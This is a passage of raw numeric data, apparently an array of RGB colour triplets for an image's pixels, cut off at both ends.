.157,0.086},{0.431,0.176,0.106},{0.482,0.224,0.141},{0.529,0.271,0.184},{0.557,0.298,0.2},{0.561,0.302,0.196},{0.549,0.29,0.188},{0.533,0.275,0.176},{0.561,0.329,0.259},{0.435,0.318,0.314},{0.435,0.318,0.314},
{0.4,0.282,0.278},{0.353,0.235,0.227},{0.306,0.192,0.18},{0.286,0.173,0.161},{0.286,0.169,0.145},{0.298,0.165,0.133},{0.267,0.141,0.114},{0.282,0.149,0.11},{0.337,0.192,0.149},{0.424,0.263,0.2},{0.459,0.294,0.227},{0.467,0.302,0.231},{0.455,0.286,0.208},{0.443,0.267,0.188},{0.42,0.243,0.173},{0.408,0.231,0.157},{0.408,0.231,0.153},{0.412,0.235,0.161},{0.427,0.251,0.169},{0.451,0.271,0.188},{0.486,0.302,0.212},{0.506,0.31,0.208},{0.494,0.298,0.192},{0.49,0.294,0.188},{0.475,0.278,0.173},{0.408,0.216,0.125},{0.373,0.184,0.098},{0.404,0.208,0.122},{0.431,0.239,0.145},{0.427,0.235,0.145},{0.404,0.216,0.133},{0.396,0.212,0.133},{0.471,0.271,0.192},{0.569,0.345,0.267},{0.549,0.318,0.247},{0.502,0.263,0.192},{0.482,0.235,0.169},{0.475,0.235,0.165},{0.463,0.235,0.161},{0.467,0.239,0.165},{0.49,0.255,0.176},{0.529,0.29,0.2},{0.608,0.361,0.255},{0.682,0.439,0.325},{0.733,0.502,0.388},{0.769,0.537,0.42},{0.776,0.545,0.431},{0.776,0.537,0.439},{0.765,0.529,0.42},{0.745,0.514,0.416},{0.706,0.467,0.376},{0.631,0.376,0.298},{0.557,0.294,0.22},
{0.541,0.278,0.2},{0.541,0.271,0.192},{0.553,0.282,0.196},{0.565,0.294,0.212},{0.6,0.329,0.235},{0.651,0.38,0.286},{0.71,0.451,0.349},{0.776,0.514,0.404},{0.812,0.541,0.431},{0.831,0.569,0.463},{0.847,0.592,0.486},{0.847,0.592,0.494},{0.847,0.588,0.498},{0.875,0.631,0.549},{0.871,0.631,0.553},{0.867,0.627,0.549},{0.863,0.639,0.561},{0.855,0.643,0.569},{0.824,0.62,0.549},{0.765,0.549,0.482},{0.678,0.451,0.38},{0.58,0.353,0.298},{0.475,0.259,0.212},{0.361,0.165,0.125},{0.267,0.086,0.063},{0.2,0.039,0.024},{0.173,0.02,0.012},{0.169,0.012,0.012},{0.18,0.02,0.012},{0.22,0.035,0.016},{0.267,0.063,0.02},{0.306,0.082,0.031},{0.325,0.098,0.043},{0.341,0.118,0.051},{0.353,0.114,0.051},{0.361,0.122,0.055},{0.373,0.129,0.063},{0.408,0.149,0.082},{0.498,0.243,0.153},{0.565,0.306,0.208},{0.576,0.318,0.212},{0.565,0.306,0.2},{0.549,0.29,0.196},{0.529,0.271,0.184},{0.596,0.384,0.325},{0.42,0.302,0.294},{0.42,0.302,0.294},{0.373,0.255,0.247},{0.322,0.204,0.188},{0.302,0.18,0.161},{0.325,0.192,0.157},{0.373,0.227,0.169},{0.514,0.341,0.247},
{0.741,0.541,0.396},{0.82,0.616,0.451},{0.792,0.592,0.427},{0.745,0.541,0.384},{0.69,0.482,0.329},{0.584,0.384,0.259},{0.518,0.322,0.212},{0.486,0.294,0.2},{0.467,0.278,0.192},{0.459,0.267,0.184},{0.459,0.275,0.188},{0.49,0.31,0.216},{0.525,0.345,0.247},{0.549,0.361,0.251},{0.541,0.349,0.227},{0.522,0.322,0.208},{0.51,0.31,0.192},{0.494,0.298,0.184},{0.463,0.267,0.165},{0.451,0.251,0.153},{0.459,0.263,0.161},{0.455,0.259,0.173},{0.451,0.267,0.176},{0.443,0.259,0.173},{0.447,0.255,0.169},{0.443,0.247,0.165},{0.659,0.447,0.357},{0.643,0.42,0.337},{0.592,0.353,0.275},{0.557,0.314,0.235},{0.541,0.29,0.208},{0.533,0.29,0.2},{0.545,0.314,0.216},{0.573,0.337,0.231},{0.624,0.373,0.267},{0.671,0.42,0.306},{0.71,0.463,0.349},{0.741,0.502,0.388},{0.749,0.51,0.4},{0.749,0.51,0.4},{0.718,0.482,0.38},{0.678,0.431,0.337},{0.651,0.392,0.302},{0.612,0.345,0.263},{0.608,0.337,0.247},{0.659,0.376,0.29},{0.694,0.416,0.322},{0.737,0.475,0.373},{0.757,0.506,0.396},{0.757,0.502,0.392},{0.776,0.529,0.416},{0.824,0.58,0.471},{0.859,0.62,0.514},
{0.886,0.659,0.553},{0.918,0.698,0.6},{0.933,0.706,0.612},{0.941,0.729,0.639},{0.945,0.737,0.655},{0.941,0.745,0.667},{0.933,0.741,0.671},{0.906,0.718,0.651},{0.847,0.639,0.569},{0.757,0.522,0.463},{0.596,0.38,0.333},{0.4,0.212,0.176},{0.235,0.082,0.059},{0.149,0.024,0.016},{0.125,0.008,0.008},{0.125,0.004,0.008},{0.141,0.008,0.008},{0.173,0.012,0.008},{0.208,0.024,0.008},{0.239,0.039,0.012},{0.271,0.063,0.024},{0.306,0.086,0.043},{0.341,0.11,0.059},{0.376,0.137,0.082},{0.396,0.153,0.102},{0.42,0.169,0.118},{0.451,0.188,0.141},{0.478,0.208,0.161},{0.506,0.235,0.18},{0.51,0.302,0.251},{0.455,0.22,0.161},{0.451,0.188,0.11},{0.557,0.298,0.2},{0.6,0.337,0.231},{0.592,0.337,0.227},{0.576,0.318,0.216},{0.553,0.298,0.204},{0.541,0.282,0.196},{0.624,0.427,0.376},{0.384,0.267,0.259},{0.384,0.267,0.259},{0.345,0.227,0.212},{0.349,0.22,0.192},{0.404,0.259,0.2},{0.651,0.463,0.333},{0.882,0.678,0.494},{0.965,0.761,0.561},{0.961,0.749,0.541},{0.922,0.71,0.494},{0.882,0.663,0.447},{0.843,0.627,0.416},{0.812,0.592,0.392},{0.765,0.549,0.369},
{0.671,0.451,0.29},{0.553,0.341,0.22},{0.541,0.341,0.22},{0.604,0.404,0.278},{0.624,0.435,0.314},{0.612,0.427,0.31},{0.588,0.4,0.278},{0.561,0.369,0.247},{0.545,0.353,0.231},{0.533,0.333,0.212},{0.514,0.314,0.188},{0.482,0.286,0.176},{0.467,0.271,0.165},{0.467,0.271,0.173},{0.467,0.271,0.18},{0.459,0.263,0.176},{0.459,0.263,0.176},{0.443,0.247,0.157},{0.435,0.239,0.145},{0.494,0.29,0.204},{0.702,0.482,0.392},{0.671,0.431,0.337},{0.675,0.42,0.314},{0.671,0.416,0.306},{0.667,0.412,0.298},{0.655,0.4,0.286},{0.643,0.384,0.267},{0.643,0.388,0.271},{0.663,0.4,0.282},{0.667,0.404,0.29},{0.659,0.396,0.286},{0.647,0.388,0.286},{0.596,0.333,0.235},{0.561,0.294,0.2},{0.569,0.298,0.204},{0.616,0.345,0.239},{0.663,0.388,0.278},{0.714,0.451,0.341},{0.765,0.514,0.408},{0.8,0.561,0.455},{0.816,0.588,0.486},{0.796,0.549,0.459},{0.765,0.522,0.435},{0.741,0.49,0.392},{0.729,0.478,0.373},{0.729,0.486,0.388},{0.753,0.506,0.42},{0.78,0.553,0.467},{0.792,0.569,0.486},{0.769,0.537,0.467},{0.714,0.486,0.424},{0.616,0.412,0.357},{0.475,0.298,0.251},
{0.373,0.192,0.161},{0.31,0.125,0.098},{0.278,0.102,0.075},{0.286,0.122,0.094},{0.333,0.145,0.106},{0.384,0.173,0.133},{0.439,0.208,0.157},{0.463,0.216,0.169},{0.467,0.216,0.169},{0.467,0.216,0.169},{0.475,0.224,0.173},{0.49,0.235,0.176},{0.522,0.267,0.204},{0.545,0.286,0.22},{0.573,0.302,0.231},{0.573,0.286,0.224},{0.561,0.282,0.216},{0.561,0.282,0.212},{0.557,0.255,0.188},{0.608,0.345,0.298},{0.647,0.388,0.373},{0.694,0.451,0.431},{0.714,0.467,0.443},{0.8,0.686,0.671},{0.71,0.569,0.541},{0.573,0.306,0.204},{0.624,0.357,0.243},{0.612,0.345,0.243},{0.592,0.329,0.227},{0.584,0.322,0.22},{0.576,0.314,0.212},{0.553,0.294,0.196},{0.647,0.459,0.416},{0.388,0.259,0.243},{0.388,0.259,0.243},{0.537,0.373,0.294},{0.784,0.592,0.439},{0.937,0.733,0.529},{0.992,0.78,0.561},{0.973,0.761,0.545},{0.953,0.737,0.518},{0.902,0.682,0.467},{0.855,0.631,0.42},{0.804,0.576,0.373},{0.761,0.529,0.333},{0.737,0.502,0.314},{0.69,0.459,0.286},{0.729,0.506,0.337},{0.816,0.608,0.435},{0.878,0.678,0.498},{0.812,0.616,0.439},{0.714,0.51,0.341},{0.616,0.416,0.271},
{0.565,0.369,0.239},{0.537,0.341,0.216},{0.525,0.322,0.196},{0.498,0.294,0.169},{0.471,0.271,0.149},{0.467,0.255,0.149},{0.471,0.267,0.165},{0.471,0.267,0.169},{0.463,0.259,0.165},{0.439,0.235,0.141},{0.42,0.22,0.133},{0.443,0.243,0.153},{0.482,0.286,0.196},{0.588,0.376,0.286},{0.69,0.455,0.365},{0.714,0.463,0.349},{0.718,0.463,0.345},{0.714,0.459,0.333},{0.69,0.431,0.31},{0.671,0.408,0.286},{0.667,0.4,0.278},{0.659,0.388,0.271},{0.651,0.38,0.259},{0.627,0.349,0.235},{0.616,0.337,0.227},{0.627,0.353,0.239},{0.663,0.388,0.271},{0.725,0.463,0.345},{0.773,0.518,0.4},{0.788,0.533,0.424},{0.78,0.525,0.416},{0.773,0.522,0.412},{0.769,0.518,0.408},{0.757,0.51,0.404},{0.733,0.482,0.38},{0.675,0.416,0.314},{0.624,0.361,0.278},{0.62,0.365,0.271},{0.62,0.365,0.271},{0.608,0.357,0.263},{0.58,0.314,0.235},{0.545,0.263,0.188},{0.525,0.235,0.165},{0.49,0.204,0.137},{0.463,0.204,0.145},{0.49,0.235,0.165},{0.553,0.282,0.2},{0.604,0.322,0.231},{0.635,0.357,0.275},{0.663,0.388,0.306},{0.678,0.392,0.31},{0.667,0.373,0.29},{0.643,0.345,0.275},
{0.639,0.353,0.278},{0.651,0.38,0.294},{0.678,0.42,0.337},{0.69,0.439,0.353},{0.698,0.443,0.361},{0.702,0.451,0.369},{0.706,0.447,0.365},{0.694,0.427,0.345},{0.678,0.404,0.329},{0.718,0.447,0.376},{0.718,0.439,0.365},{0.718,0.427,0.341},{0.722,0.424,0.353},{0.749,0.518,0.467},{0.847,0.678,0.678},{0.89,0.729,0.722},{0.886,0.718,0.702},{0.941,0.875,0.863},{0.831,0.71,0.678},{0.635,0.365,0.247},{0.627,0.361,0.243},{0.612,0.349,0.239},{0.592,0.329,0.231},{0.584,0.318,0.22},{0.573,0.314,0.212},{0.565,0.302,0.204},{0.667,0.494,0.455},{0.812,0.616,0.447},{0.812,0.616,0.447},{0.988,0.796,0.576},{0.996,0.804,0.58},{0.976,0.769,0.545},{0.922,0.698,0.482},{0.855,0.635,0.427},{0.788,0.565,0.369},{0.718,0.49,0.31},{0.682,0.459,0.286},{0.698,0.471,0.302},{0.78,0.569,0.388},{0.843,0.639,0.463},{0.894,0.694,0.518},{0.929,0.733,0.549},{0.906,0.706,0.506},{0.867,0.655,0.443},{0.8,0.588,0.384},{0.722,0.502,0.329},{0.616,0.412,0.259},{0.529,0.325,0.192},{0.475,0.271,0.145},{0.463,0.259,0.133},{0.478,0.275,0.149},{0.494,0.29,0.173},{0.494,0.286,0.173},
{0.471,0.263,0.157},{0.447,0.235,0.129},{0.447,0.235,0.129},{0.518,0.31,0.2},{0.604,0.404,0.29},{0.651,0.459,0.337},{0.682,0.502,0.388},{0.671,0.447,0.341},{0.714,0.463,0.345},{0.733,0.478,0.353},{0.733,0.475,0.345},{0.725,0.467,0.333},{0.722,0.459,0.329},{0.718,0.455,0.325},{0.718,0.459,0.325},{0.725,0.455,0.325},{0.729,0.463,0.337},{0.745,0.478,0.353},{0.761,0.502,0.38},{0.784,0.537,0.416},{0.8,0.569,0.451},{0.8,0.565,0.451},{0.784,0.541,0.431},{0.761,0.514,0.4},{0.749,0.494,0.384},{0.741,0.475,0.373},{0.733,0.471,0.369},{0.714,0.451,0.357},{0.698,0.427,0.329},{0.667,0.392,0.294},{0.643,0.369,0.267},{0.624,0.357,0.259},{0.62,0.361,0.267},{0.631,0.376,0.286},{0.639,0.376,0.282},{0.655,0.384,0.286},{0.667,0.4,0.298},{0.686,0.424,0.325},{0.733,0.471,0.365},{0.761,0.49,0.384},{0.788,0.514,0.412},{0.804,0.537,0.435},{0.827,0.58,0.478},{0.839,0.584,0.494},{0.839,0.576,0.494},{0.843,0.576,0.502},{0.82,0.537,0.463},{0.82,0.561,0.478},{0.804,0.545,0.459},{0.816,0.58,0.498},{0.835,0.612,0.529},{0.855,0.627,0.553},{0.871,0.651,0.576},
{0.871,0.659,0.584},{0.867,0.643,0.561},{0.859,0.62,0.541},{0.875,0.631,0.561},{0.875,0.62,0.549},{0.875,0.624,0.553},{0.855,0.58,0.506},{0.835,0.545,0.482},{0.827,0.533,0.467},{0.831,0.537,0.455},{0.769,0.478,0.38},{0.671,0.388,0.29},{0.643,0.361,0.247},{0.635,0.365,0.243},{0.624,0.361,0.247},{0.616,0.353,0.243},{0.608,0.345,0.239},{0.596,0.333,0.227},{0.584,0.322,0.22},{0.573,0.31,0.212},{0.69,0.537,0.514},{0.992,0.8,0.565},{0.992,0.8,0.565},{0.969,0.769,0.541},{0.91,0.69,0.471},{0.843,0.627,0.412},{0.824,0.608,0.404},{0.831,0.62,0.424},{0.839,0.631,0.439},{0.863,0.659,0.471},{0.894,0.698,0.514},{0.933,0.737,0.557},{0.937,0.749,0.569},{0.898,0.706,0.525},{0.851,0.651,0.459},{0.812,0.6,0.404},{0.8,0.58,0.376},{0.765,0.549,0.365},{0.706,0.486,0.314},{0.635,0.416,0.263},{0.537,0.325,0.192},{0.49,0.286,0.165},{0.498,0.294,0.176},{0.514,0.314,0.192},{0.522,0.318,0.2},{0.529,0.333,0.216},{0.553,0.357,0.235},{0.608,0.416,0.29},{0.671,0.486,0.361},{0.729,0.557,0.439},{0.769,0.612,0.494},{0.788,0.631,0.522},{0.796,0.643,0.533},
{0.773,0.616,0.51},{0.725,0.482,0.365},{0.769,0.518,0.384},{0.776,0.518,0.38},{0.788,0.533,0.396},{0.796,0.545,0.408},{0.796,0.545,0.404},{0.788,0.533,0.396},{0.792,0.537,0.396},{0.804,0.553,0.416},{0.808,0.553,0.416},{0.804,0.545,0.42},{0.796,0.533,0.404},{0.788,0.525,0.404},{0.776,0.514,0.396},{0.757,0.49,0.373},{0.745,0.478,0.361},{0.765,0.502,0.384},{0.788,0.522,0.404},{0.796,0.522,0.412},{0.788,0.514,0.404},{0.78,0.478,0.376},{0.78,0.482,0.388},{0.788,0.482,0.392},{0.773,0.463,0.365},{0.757,0.447,0.345},{0.761,0.467,0.365},{0.792,0.525,0.416},{0.827,0.584,0.482},{0.851,0.616,0.522},{0.882,0.655,0.565},{0.886,0.671,0.58},{0.914,0.678,0.592},{0.922,0.682,0.592},{0.925,0.69,0.608},{0.922,0.698,0.616},{0.922,0.686,0.608},{0.898,0.659,0.576},{0.898,0.651,0.557},{0.898,0.651,0.565},{0.906,0.667,0.584},{0.906,0.671,0.596},{0.906,0.682,0.612},{0.925,0.714,0.643},{0.941,0.745,0.682},{0.957,0.769,0.706},{0.957,0.757,0.69},{0.945,0.733,0.659},{0.929,0.714,0.631},{0.894,0.663,0.569},{0.851,0.6,0.51},{0.839,0.588,0.506},{0.839,0.588,0.498},
{0.812,0.537,0.435},{0.757,0.463,0.365},{0.702,0.4,0.294},{0.671,0.365,0.251},{0.667,0.369,0.255},{0.663,0.384,0.267},{0.659,0.388,0.271},{0.659,0.392,0.278},{0.647,0.388,0.271},{0.639,0.38,0.263},{0.631,0.369,0.247},{0.612,0.349,0.239},{0.6,0.337,0.231},{0.584,0.322,0.224},{0.71,0.569,0.545},{0.937,0.722,0.506},{0.937,0.722,0.506},{0.918,0.702,0.482},{0.925,0.71,0.49},{0.937,0.729,0.518},{0.937,0.733,0.537},{0.945,0.741,0.545},{0.957,0.765,0.576},{0.961,0.776,0.592},{0.902,0.718,0.537},{0.855,0.663,0.478},{0.804,0.6,0.416},{0.765,0.561,0.373},{0.769,0.557,0.369},{0.741,0.533,0.361},{0.702,0.494,0.329},{0.631,0.42,0.267},{0.569,0.357,0.212},{0.522,0.31,0.176},{0.49,0.29,0.165},{0.494,0.294,0.18},{0.51,0.314,0.204},{0.533,0.337,0.224},{0.565,0.373,0.247},{0.612,0.424,0.298},{0.671,0.49,0.38},{0.71,0.537,0.435},{0.722,0.557,0.455},{0.718,0.565,0.463},{0.722,0.561,0.463},{0.714,0.549,0.451},{0.682,0.514,0.412},{0.678,0.482,0.373},{0.78,0.529,0.4},{0.824,0.576,0.439},{0.847,0.6,0.459},{0.859,0.612,0.475},{0.859,0.608,0.467},
{0.851,0.604,0.463},{0.847,0.6,0.455},{0.843,0.592,0.447},{0.843,0.592,0.455},{0.839,0.588,0.451},{0.831,0.58,0.443},{0.831,0.576,0.439},{0.816,0.561,0.424},{0.808,0.549,0.416},{0.812,0.557,0.427},{0.824,0.58,0.451},{0.847,0.6,0.471},{0.867,0.62,0.494},{0.886,0.643,0.529},{0.91,0.671,0.573},{0.918,0.675,0.584},{0.91,0.643,0.553},{0.91,0.651,0.553},{0.925,0.682,0.592},{0.941,0.71,0.624},{0.937,0.718,0.627},{0.941,0.718,0.631},{0.949,0.741,0.655},{0.949,0.757,0.667},{0.945,0.753,0.671},{0.957,0.757,0.678},{0.965,0.753,0.671},{0.969,0.749,0.663},{0.965,0.741,0.663},{0.965,0.753,0.675},{0.969,0.765,0.682},{0.965,0.761,0.678},{0.953,0.745,0.671},{0.941,0.729,0.651},{0.914,0.698,0.616},{0.878,0.651,0.573},{0.831,0.592,0.522},{0.804,0.553,0.471},{0.78,0.522,0.427},{0.773,0.498,0.4},{0.769,0.49,0.38},{0.753,0.459,0.341},{0.729,0.427,0.302},{0.725,0.42,0.286},{0.725,0.42,0.294},{0.725,0.424,0.298},{0.722,0.427,0.302},{0.71,0.416,0.29},{0.702,0.404,0.278},{0.702,0.412,0.294},{0.694,0.416,0.298},{0.686,0.412,0.294},{0.686,0.42,0.294},
{0.682,0.416,0.298},{0.671,0.404,0.29},{0.663,0.396,0.278},{0.651,0.388,0.275},{0.643,0.373,0.255},{0.631,0.369,0.255},{0.616,0.349,0.239},{0.6,0.345,0.247},{0.729,0.596,0.584},{0.988,0.765,0.537},{0.988,0.765,0.537},{0.984,0.776,0.557},{0.984,0.78,0.565},{0.988,0.808,0.608},{0.984,0.816,0.627},{0.941,0.769,0.604},{0.871,0.694,0.537},{0.82,0.635,0.475},{0.769,0.573,0.408},{0.741,0.545,0.373},{0.729,0.529,0.369},{0.722,0.525,0.369},{0.698,0.502,0.349},{0.635,0.431,0.282},{0.588,0.388,0.251},{0.561,0.357,0.227},{0.557,0.357,0.231},{0.557,0.361,0.235},{0.565,0.365,0.239},{0.569,0.376,0.251},{0.565,0.376,0.259},{0.588,0.404,0.29},{0.592,0.412,0.31},{0.596,0.424,0.329},{0.596,0.42,0.325},{0.6,0.42,0.322},{0.596,0.416,0.314},{0.588,0.404,0.298},{0.592,0.416,0.31},{0.588,0.416,0.325},{0.541,0.38,0.302},{0.58,0.38,0.298},{0.824,0.584,0.455},{0.867,0.627,0.49},{0.89,0.651,0.518},{0.902,0.663,0.529},{0.894,0.655,0.525},{0.89,0.655,0.522},{0.894,0.647,0.51},{0.89,0.643,0.506},{0.875,0.627,0.49},{0.871,0.62,0.482},{0.859,0.612,0.467},
{0.847,0.592,0.451},{0.851,0.6,0.463},{0.847,0.604,0.475},{0.847,0.612,0.482},{0.843,0.616,0.486},{0.855,0.627,0.502},{0.859,0.631,0.506},{0.867,0.631,0.514},{0.878,0.643,0.533},{0.894,0.659,0.553},{0.914,0.678,0.576},{0.941,0.718,0.627},{0.965,0.761,0.678},{0.953,0.745,0.663},{0.945,0.737,0.655},{0.922,0.725,0.647},{0.914,0.725,0.643},{0.918,0.714,0.635},{0.933,0.737,0.663},{0.949,0.753,0.678},{0.933,0.729,0.647},{0.878,0.659,0.576},{0.722,0.506,0.439},{0.522,0.357,0.314},{0.471,0.282,0.247},{0.435,0.224,0.192},{0.396,0.173,0.137},{0.353,0.125,0.086},{0.337,0.09,0.043},{0.361,0.094,0.035},{0.435,0.145,0.075},{0.502,0.208,0.118},{0.565,0.271,0.165},{0.62,0.325,0.212},{0.667,0.376,0.255},{0.686,0.408,0.282},{0.71,0.431,0.306},{0.714,0.439,0.31},{0.722,0.439,0.314},{0.725,0.463,0.329},{0.729,0.463,0.337},{0.729,0.467,0.341},{0.729,0.463,0.337},{0.725,0.463,0.337},{0.722,0.463,0.337},{0.714,0.451,0.325},{0.71,0.451,0.329},{0.702,0.443,0.318},{0.69,0.424,0.306},{0.682,0.42,0.298},{0.671,0.404,0.286},{0.655,0.388,0.271},{0.643,0.38,0.267},
{0.624,0.357,0.243},{0.624,0.376,0.278},{0.737,0.616,0.604},{0.992,0.808,0.592},{0.992,0.808,0.592},{0.988,0.827,0.627},{0.933,0.773,0.592},{0.859,0.682,0.525},{0.788,0.616,0.467},{0.757,0.58,0.439},{0.725,0.549,0.4},{0.714,0.529,0.388},{0.71,0.529,0.396},{0.722,0.545,0.416},{0.718,0.545,0.424},{0.69,0.518,0.396},{0.659,0.478,0.361},{0.643,0.463,0.341},{0.627,0.439,0.322},{0.624,0.439,0.314},{0.62,0.431,0.306},{0.616,0.427,0.31},{0.612,0.439,0.325},{0.58,0.412,0.31},{0.537,0.369,0.275},{0.475,0.306,0.216},{0.431,0.251,0.161},{0.416,0.212,0.122},{0.392,0.184,0.086},{0.376,0.165,0.071},{0.361,0.157,0.071},{0.302,0.118,0.059},{0.247,0.082,0.039},{0.239,0.067,0.031},{0.286,0.086,0.047},{0.408,0.176,0.106},{0.835,0.596,0.467},{0.898,0.663,0.533},{0.925,0.698,0.569},{0.929,0.698,0.576},{0.925,0.69,0.565},{0.918,0.675,0.545},{0.914,0.675,0.549},{0.91,0.675,0.549},{0.906,0.682,0.557},{0.902,0.682,0.557},{0.898,0.675,0.553},{0.894,0.671,0.545},{0.882,0.655,0.533},{0.882,0.651,0.533},{0.878,0.643,0.514},{0.867,0.624,0.494},{0.863,0.624,0.494},
{0.851,0.612,0.482},{0.831,0.588,0.467},{0.812,0.569,0.455},{0.816,0.58,0.467},{0.831,0.596,0.478},{0.847,0.608,0.498},{0.855,0.616,0.506},{0.839,0.596,0.498},{0.827,0.592,0.494},{0.804,0.573,0.478},{0.792,0.553,0.467},{0.769,0.525,0.443},{0.722,0.459,0.384},{0.675,0.384,0.31},{0.596,0.278,0.212},{0.486,0.161,0.102},{0.373,0.09,0.051},{0.133,0.008,0.008},{0.196,0.008,0.008},{0.259,0.031,0.008},{0.306,0.055,0.016},{0.329,0.071,0.02},{0.357,0.082,0.027},{0.373,0.09,0.031},{0.392,0.106,0.043},{0.412,0.122,0.051},{0.443,0.161,0.078},{0.482,0.208,0.114},{0.529,0.259,0.157},{0.565,0.29,0.184},{0.604,0.341,0.227},{0.643,0.384,0.267},{0.675,0.416,0.298},{0.702,0.443,0.322},{0.722,0.467,0.341},{0.733,0.478,0.357},{0.733,0.486,0.365},{0.737,0.482,0.365},{0.737,0.482,0.361},{0.737,0.482,0.365},{0.725,0.467,0.349},{0.722,0.467,0.345},{0.718,0.459,0.337},{0.702,0.443,0.318},{0.69,0.431,0.31},{0.671,0.408,0.286},{0.663,0.396,0.282},{0.643,0.38,0.267},{0.655,0.424,0.333},{0.753,0.635,0.631},{0.804,0.616,0.427},{0.804,0.616,0.427},{0.682,0.478,0.306},
{0.647,0.447,0.29},{0.647,0.459,0.318},{0.69,0.518,0.388},{0.718,0.561,0.439},{0.733,0.584,0.467},{0.725,0.573,0.459},{0.706,0.545,0.435},{0.675,0.506,0.396},{0.651,0.471,0.353},{0.631,0.447,0.322},{0.624,0.443,0.322},{0.616,0.439,0.329},{0.576,0.404,0.306},{0.498,0.333,0.239},{0.486,0.318,0.224},{0.459,0.286,0.188},{0.435,0.263,0.165},{0.388,0.224,0.125},{0.349,0.176,0.082},{0.349,0.165,0.078},{0.373,0.18,0.082},{0.408,0.208,0.106},{0.42,0.216,0.118},{0.424,0.22,0.122},{0.443,0.235,0.145},{0.463,0.259,0.169},{0.431,0.235,0.157},{0.404,0.216,0.141},{0.455,0.239,0.161},{0.459,0.224,0.145},{0.745,0.498,0.388},{0.902,0.667,0.537},{0.937,0.714,0.592},{0.949,0.733,0.616},{0.945,0.733,0.616},{0.937,0.718,0.6},{0.925,0.71,0.588},{0.929,0.722,0.596},{0.925,0.718,0.6},{0.925,0.714,0.604},{0.925,0.718,0.6},{0.918,0.706,0.584},{0.914,0.698,0.576},{0.91,0.69,0.569},{0.906,0.671,0.553},{0.902,0.663,0.541},{0.898,0.655,0.529},{0.89,0.655,0.529},{0.859,0.627,0.51},{0.843,0.612,0.502},{0.851,0.608,0.494},{0.835,0.584,0.475},{0.816,0.549,0.443},
{0.788,0.518,0.408},{0.757,0.467,0.357},{0.722,0.427,0.325},{0.682,0.392,0.294},{0.651,0.365,0.271},{0.62,0.333,0.247},{0.596,0.294,0.204},{0.588,0.267,0.176},{0.584,0.255,0.165},{0.573,0.243,0.161},{0.565,0.235,0.153},{0.498,0.196,0.133},{0.439,0.153,0.102},{0.408,0.129,0.078},{0.376,0.098,0.051},{0.353,0.086,0.031},{0.345,0.078,0.024},{0.357,0.082,0.027},{0.361,0.09,0.031},{0.365,0.09,0.031},{0.361,0.094,0.035},{0.361,0.098,0.035},{0.361,0.102,0.035},{0.38,0.118,0.051},{0.404,0.137,0.067},{0.431,0.173,0.094},{0.467,0.208,0.125},{0.51,0.251,0.161},{0.561,0.302,0.208},{0.604,0.349,0.251},{0.659,0.412,0.302},{0.69,0.443,0.329},{0.714,0.463,0.345},{0.733,0.482,0.369},{0.741,0.486,0.369},{0.741,0.486,0.369},{0.733,0.475,0.357},{0.725,0.471,0.349},{0.71,0.451,0.325},{0.69,0.431,0.31},{0.682,0.424,0.306},{0.667,0.408,0.294},{0.682,0.471,0.396},{0.765,0.647,0.643},{0.706,0.506,0.345},{0.706,0.506,0.345},{0.706,0.525,0.388},{0.714,0.557,0.431},{0.706,0.561,0.451},{0.686,0.545,0.443},{0.624,0.478,0.373},{0.573,0.416,0.31},{0.565,0.388,0.275},
{0.584,0.4,0.278},{0.592,0.408,0.282},{0.596,0.408,0.29},{0.573,0.388,0.282},{0.498,0.306,0.212},{0.439,0.247,0.157},{0.435,0.255,0.169},{0.439,0.263,0.173},{0.384,0.216,0.129},{0.345,0.18,0.106},{0.361,0.18,0.102},{0.376,0.196,0.106},{0.4,0.208,0.11},{0.416,0.224,0.125},{0.424,0.231,0.133},{0.427,0.235,0.141},{0.447,0.251,0.157},{0.459,0.267,0.173},{0.486,0.286,0.2},{0.482,0.282,0.196},{0.482,0.286,0.2},{0.482,0.282,0.2},{0.482,0.282,0.2},{0.502,0.302,0.224},{0.561,0.345,0.259},{0.847,0.608,0.482},{0.937,0.706,0.592},{0.953,0.729,0.616},{0.953,0.741,0.627},{0.945,0.741,0.631},{0.945,0.741,0.624},{0.949,0.745,0.624},{0.949,0.749,0.631},{0.945,0.741,0.624},{0.941,0.733,0.616},{0.933,0.718,0.6},{0.922,0.702,0.588},{0.918,0.698,0.58},{0.91,0.682,0.561},{0.906,0.682,0.565},{0.906,0.682,0.569},{0.906,0.686,0.584},{0.918,0.706,0.608},{0.925,0.706,0.604},{0.918,0.675,0.569},{0.882,0.62,0.506},{0.847,0.565,0.459},{0.824,0.533,0.431},{0.824,0.533,0.431},{0.816,0.529,0.42},{0.788,0.502,0.388},{0.737,0.447,0.345},{0.722,0.424,0.325},
{0.702,0.412,0.306},{0.682,0.392,0.294},{0.678,0.392,0.29},{0.686,0.392,0.29},{0.678,0.38,0.275},{0.675,0.369,0.267},{0.655,0.341,0.247},{0.627,0.31,0.224},{0.596,0.275,0.192},{0.596,0.275,0.192},{0.573,0.259,0.184},{0.525,0.216,0.149},{0.49,0.188,0.118},{0.471,0.173,0.11},{0.455,0.165,0.102},{0.435,0.157,0.094},{0.42,0.141,0.082},{0.392,0.122,0.063},{0.38,0.118,0.063},{0.38,0.118,0.067},{0.384,0.122,0.067},{0.38,0.11,0.055},{0.369,0.094,0.039},{0.376,0.102,0.043},{0.431,0.161,0.086},{0.498,0.227,0.145},{0.631,0.373,0.263},{0.733,0.486,0.369},{0.757,0.51,0.392},{0.757,0.502,0.38},{0.753,0.498,0.38},{0.741,0.482,0.365},{0.725,0.471,0.353},{0.71,0.455,0.333},{0.702,0.447,0.329},{0.698,0.451,0.345},{0.71,0.525,0.467},{0.776,0.663,0.659},{0.6,0.412,0.278},{0.6,0.412,0.278},{0.58,0.4,0.278},{0.573,0.396,0.286},{0.561,0.396,0.294},{0.561,0.396,0.298},{0.596,0.431,0.329},{0.608,0.427,0.325},{0.565,0.384,0.278},{0.522,0.329,0.227},{0.482,0.278,0.176},{0.467,0.247,0.153},{0.49,0.278,0.18},{0.533,0.329,0.231},{0.537,0.333,0.231},
